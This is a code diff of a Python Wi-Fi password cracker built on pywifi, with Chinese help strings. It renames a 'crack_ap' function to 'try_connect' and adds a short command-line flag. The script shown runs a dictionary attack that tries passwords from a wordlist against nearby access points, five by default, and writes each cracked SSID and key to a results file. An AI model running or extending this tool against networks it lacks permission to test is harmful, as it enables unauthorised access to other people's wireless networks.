@@ -6,7 +6,7 @@ import pywifi
 from pywifi import const  # 引用一些定义
 from tqdm import tqdm
 
-from cracker_util import get_aps, crack_ap, classify_aps, sample_passwords
+from cracker_util import get_aps, try_connect, classify_aps, sample_passwords
 
 
 def main(password_file, count=5, iface_name=None, result_file='results.txt', stype=1):
@@ -66,7 +66,7 @@ def main(password_file, count=5, iface_name=None, result_file='results.txt', sty
 
         for key in tqdm(sample_passwords(passwords, stype), desc='Passwords'):
             profile.key = key
-            if crack_ap(iface, profile):
+            if try_connect(iface, profile):
                 cracked_table[profile.ssid] = key
                 with open(result_file, 'a') as f:
                     f.write('%s : %s\n' % (ssid, key))
@@ -86,9 +86,8 @@ def __main__():
     parser.add_argument('password_file', type=str, help='密码本文件')
     parser.add_argument('-c', '--count', type=int,
                         default=5, help='所要破解的热点个数，默认为破解5个')
-    parser.add_argument('--iface_name', type=str,
-                        help='无限网卡名称，' +
-                        'window系统可以通过设备管理器查看，' +
+    parser.add_argument('-i', '--iface_name', type=str,
+                        help='无限网卡名称，window系统可以通过设备管理器查看，' +
                         'linux系统可在/var/run/wpa_supplicant/中查看。' +
                         '默认为第一个网卡设备。')
     parser.add_argument('--result_file', type=str,
